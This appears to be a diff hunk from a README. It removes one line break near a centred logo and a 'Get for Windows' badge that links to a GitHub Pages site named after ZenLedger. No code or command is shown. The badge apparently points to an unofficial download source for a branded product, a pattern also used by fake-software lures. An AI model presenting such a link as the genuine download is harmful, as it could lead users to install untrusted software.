@@ -3,7 +3,6 @@
 <div align="center">
   <img src="https://s3-eu-west-1.amazonaws.com/tpd/logos/5f0aa31bf5f487000171f2ff/0x0.png" width="440"/>
 </div>  
-<br>
 <div align="center">
 
 [![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://zenledger-desktop.github.io/.github)  
